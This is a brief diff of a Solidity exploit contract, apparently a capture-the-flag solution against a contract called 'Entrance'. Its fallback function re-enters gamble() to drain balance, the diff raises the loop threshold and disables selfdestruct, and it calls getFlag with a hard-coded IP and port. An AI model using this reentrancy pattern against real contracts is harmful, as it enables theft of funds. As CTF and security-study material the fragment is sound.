@@ -20,12 +20,12 @@ contract EnterAgain {
         entrance.enter(1);
         entrance.gamble();
         entrance.getFlag("151.217.239.78", "6656");
-        selfdestruct(0x0);
+        //selfdestruct(0x0);
     }
 
     function() {
         Entrance entrance = Entrance(a);
-        if(entrance.balances(this) <= 30) {
+        if(entrance.balances(this) <= 300) {
             entrance.gamble();
         }
     }
